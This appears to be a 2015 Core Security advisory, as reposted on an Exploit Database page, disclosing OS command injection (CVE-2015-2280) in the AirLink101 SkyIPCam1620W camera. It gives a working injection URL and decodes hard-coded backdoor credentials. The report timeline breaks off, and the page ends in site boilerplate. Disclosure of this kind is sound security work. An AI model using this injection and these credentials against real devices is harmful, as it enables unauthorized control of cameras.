1. Advisory Information

Title: AirLink101 SkyIPCam1620W OS Command Injection
Advisory ID: CORE-2015-0011
Advisory URL: <http://www.coresecurity.com/advisories/airlink101-skyipcam1620w-os-command-injection>
Date published: 2015-07-08
Date of last update: 2015-07-08
Vendors contacted: AirLink101
Release mode: User release

2. Vulnerability Information

Class: OS Command Injection [CWE-78], Use of Hard-coded Credentials" [CWE-798]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2015-2280

3. Vulnerability Description

AirLink101 [2] SkyIPCam1620W Wireless N MPEG4 3GPP Network Camera streams supreme quality MPEG4 and MJPEG image. It
supports remote surveillance on computers over the Internet or on mobile handheld devices.

The SkyIPCam1620W Wireless N MPEG4 3GPP Network Camera [1] is vulnerable to an OS Command Injection Vulnerability in
the snwrite.cgi binary.

4. Vulnerable Packages

AirLink101 SkyIPCam1620W Wireless N MPEG4 3GPP Network Camera with firmware FW_AIC1620W_1.1.0-12_20120709_r1192.pck
(Aug. 2012)
Other devices based on the same firmware are probably affected too, but they were not tested.

5. Vendor Information, Solutions and Workarounds

Core Security recommends applying a WAF (Web Application Firewall) rule that would filter the vulnerable request
(either the CGI file or the parameters where the injection is performed) in order to avoid exploitation.

Contact the vendor for further information.

6. Credits

This vulnerability was discovered and researched by Nahuel Riva from the Core Security Exploit Writing Team. The
publication of this advisory was coordinated by Joaquin Rodriguez Varela from the Core Security Advisories Team.

7. Technical Description / Proof of Concept Code

7.1. OS Command Injection in CGI binary file

[CVE-2015-2280] The snwrite.cgi binary has an OS Command Injection at function loc_8928 when handling the "mac"
parameter:

.text:00008928
.text:00008928 loc_8928
.text:00008928 BL memset
.text:0000892C LDR R3, [R7,#0x40]
.text:00008930 LDR R2, =stderr
.text:00008934 ADD R3, R5, R3
.text:00008938 LDR R0, [R2] ; stream
.text:0000893C LDR R1, =aMacS ; "mac = %s"
.text:00008940 LDR R2, [R3,#0x104]
.text:00008944 BL fprintf
.text:00008948 LDR R2, [R7,#0x40]
.text:0000894C ADD R2, R5, R2
.text:00008950 LDR R3, [R2,#0x104]
.text:00008954 MOV R1, #0x80 ; maxlen
.text:00008958 LDR R2, =aEtcInit_dMacwr ; "/etc/init.d/macwrite.sh %s 1>/dev/null "...
.text:0000895C MOV R0, R8 ; s
.text:00008960 BL snprintf
.text:00008964 MOV R0, R8 ; command
.text:00008968 BL system
.text:0000896C LDR R4, [R7,#0x40]
.text:00008970 B loc_8908
.text:00008970 ; End of function sub_88A8
.text:00008970
The "mac" parameter is used in a printf() call to build a command to execute the macwrite.sh shell script to update the
MAC Address configuration. The printf() built string is then used in a system() call. Therefore, it is possible to
inject arbitrary commands just by putting a ";" after the "mac" parameter, for example:

http://<Camera_IP>/maker/snwrite.cgi?mac=1234;ps

In order to invoke the snwrite.cgi binary valid credentials are required, but a backdoor account located in
/server/usr.ini can be used:

nriva@fastix:/mnt/firmware/server$ cat usr.ini

admin=Basic YWRtaW46YWRtaW4=
maker=Basic cHJvZHVjdG1ha2VyOmZ0dnNiYW5uZWRjb2Rl

These accounts are encoded in base64 so it is relatively easy to recover them:

```
> > > ```
> > > "YWRtaW46YWRtaW4=".decode("base64")
> > >
> > > ```

```
'admin:admin'

```
> > > ```
> > > "cHJvZHVjdG1ha2VyOmZ0dnNiYW5uZWRjb2Rl".decode("base64")
> > >
> > > ```

```
'productmaker:ftvsbannedcode'

Using the 'productmaker:ftvsbannedcode' backdoor account allows access to the path /maker/snwrite.cgi and therefore the
ability to perform the injection explained above.

8. Report Timeline

2015-05-04: Core Security sent an initial email notification to AirLink101. Publication date set to June 8, 2015.
2015-05-07: Core Security sent another email notification to AirLink101.

non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as âGoogle Hackingâ was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnnyâs talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term âGoogledorkâ to refer
to âa foolish or inept person as revealed by Googleâ. This was meant to draw attention to
the fact that this was not a âGoogle problemâ but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term âdorkâ became shorthand for a search query that located sensitive
information and âdorksâ were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
